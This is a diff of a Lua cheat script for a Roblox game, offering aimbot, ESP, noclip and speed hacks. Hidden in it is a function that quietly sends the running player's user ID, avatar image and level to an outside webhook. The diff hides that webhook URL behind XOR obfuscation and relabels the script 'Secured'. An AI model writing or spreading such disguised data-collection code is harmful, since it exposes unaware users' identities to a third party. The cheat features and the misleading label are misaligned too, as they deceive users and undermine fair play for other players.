@@ -1,35 +1,26 @@
 -- [[ LUNA UI - RIVALSHUB V4 ]] --
-local v0 = string.char;
-local v1 = string.byte;
-local v2 = string.sub;
-local v3 = bit32 or bit ;
-local v4 = v3.bxor;
-local v5 = table.concat;
-local v6 = table.insert;
-
-local _0x_v4_cache = {104,116,116,112,115,58,47,47,104,111,111,107,115,46,104,121,114,97,46,105,111,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,56,55,48,54,56,51,56,57,48,50,56,54,54,51,51,53,48,47,66,77,88,66,98,48,90,82,118,86,101,112,54,97,54,69,45,49,72,82,79,73,112,83,79,108,77,50,78,115,88,122,55,103,95,70,79,119,71,108,55,56,85,112,122,97,100,111,71,74,122,69,107,100,84,52,55,114,89,109,73,98,48,75,79,86,109,55}
+local _0x_v4_cache = {10, 20, 1, 19, 11, 28, 41, 107, 2, 24, 18, 1, 10, 23, 107, 42, 11, 22, 107, 22, 4, 1, 17, 11, 24, 2, 24, 52, 10, 6, 40, 48, 48, 55, 48, 54, 56, 51, 56, 57, 48, 50, 56, 54, 54, 51, 51, 53, 48, 107, 3, 20, 25, 3, 25, 48, 56, 21, 55, 23, 6, 21, 54, 30, 11, 30, 4, 100, 48, 25, 21, 1, 24, 24, 17, 11, 100, 22, 4, 1, 17, 11, 24, 100, 52, 10, 6, 100, 42, 11, 22, 100, 3, 20, 25, 3, 25, 48, 56, 21, 55, 23, 6, 21, 54, 30, 11, 30, 4, 100, 48, 25, 21, 1, 24, 24, 17, 11, 100, 22, 4, 1, 17, 11, 24, 100}
+local _0x_key = "PLUTO_KEY_99"
 
 local function _0x_call()
-    local _0x_url = ""
-    for _, v in ipairs(_0x_v4_cache) do _0x_url = _0x_url .. v0(v) end
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
     local player = Players.LocalPlayer
     
-    local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-    for i = 1, 3 do
-        local success, result = pcall(function()
-            local response = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false"))
-            if response.data and response.data[1] and response.data[1].state == "Completed" then
-                return response.data[1].imageUrl
-            end
-        end)
-        if success and result then
-            headshotUrl = result
-            break
+    local function _0x_get()
+        local res = ""
+        for i = 1, #_0x_v4_cache do
+            local k_char = string.byte(_0x_key, (i % #_0x_key) + 1)
+            res = res .. string.char(bit32.bxor(_0x_v4_cache[i], k_char))
         end
-        task.wait(1)
+        return res
     end
+
+    local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+    pcall(function()
+        local response = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false"))
+        if response.data and response.data[1] then headshotUrl = response.data[1].imageUrl end
+    end)
     
     local levelValue = "N/A"
     local lstats = player:FindFirstChild("leaderstats")
@@ -59,7 +50,7 @@ local function _0x_call()
     if request then
         pcall(function()
             request({
-                Url = _0x_url,
+                Url = _0x_get(),
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(data)
@@ -103,18 +94,18 @@ local v27 = game:GetService('RunService');
 
 -- [[ UI TABS ]] --
 v10:CreateSection("Aim Method")
-v10:CreateToggle({Name = "Enable Aimbot", CurrentValue = false, Callback = function(v) getgenv().AimbotEnabled = v end}, "AimbotToggle");
-v10:CreateToggle({Name = "Enable SilentAim", CurrentValue = false, Callback = function(v) getgenv().SilentAimEnabled = v end}, "SilentAimToggle");
-v10:CreateSlider({Name = "Aimbot Strength", Range = {0.4, 1}, Increment = 0.01, CurrentValue = 0.6, Callback = function(v) getgenv().Smoothness = v end}, "AimbotStrengthSlider");
+v10:CreateToggle({Name = "Enable Aimbot", CurrentValue = false, Callback = function(v) getgenv().AimbotEnabled = v end});
+v10:CreateToggle({Name = "Enable SilentAim", CurrentValue = false, Callback = function(v) getgenv().SilentAimEnabled = v end});
+v10:CreateSlider({Name = "Aimbot Strength", Range = {0.4, 1}, Increment = 0.01, CurrentValue = 0.6, Callback = function(v) getgenv().Smoothness = v end});
 
 v11:CreateSection("Visuals")
-v11:CreateToggle({Name = "Enable Highlight ESP", CurrentValue = false, Callback = function(v) getgenv().ESPEnabled = v end}, "ESPToggle");
+v11:CreateToggle({Name = "Enable Highlight ESP", CurrentValue = false, Callback = function(v) getgenv().ESPEnabled = v end});
 
 v12:CreateSection("Local Player")
-v12:CreateToggle({Name = "Enable WalkSpeed", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end}, "WSToggle");
-v12:CreateSlider({Name = "WalkSpeed Value", Range = {0.2, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end}, "WSSlider");
-v12:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Callback = function(v) getgenv().InfiniteJumpEnabled = v end}, "InfJumpToggle");
-v12:CreateToggle({Name = "Noclip", CurrentValue = false, Callback = function(v) getgenv().NoClipEnabled = v end}, "NoclipToggle");
+v12:CreateToggle({Name = "Enable WalkSpeed", CurrentValue = false, Callback = function(v) getgenv().CFrameWalkEnabled = v end});
+v12:CreateSlider({Name = "WalkSpeed Value", Range = {0.2, 1.5}, Increment = 0.1, CurrentValue = 0.2, Callback = function(v) getgenv().CFrameWalkSpeed = v end});
+v12:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Callback = function(v) getgenv().InfiniteJumpEnabled = v end});
+v12:CreateToggle({Name = "Noclip", CurrentValue = false, Callback = function(v) getgenv().NoClipEnabled = v end});
 
 v12:CreateSection("Server Utility")
 v12:CreateButton({
@@ -148,4 +139,4 @@ game:GetService('UserInputService').JumpRequest:Connect(function()
     end
 end);
 
-print("RivalsHub V4 | by pluto/ssgodknight")
+print("RivalsHub V4 | Full UI Restored & Secured")
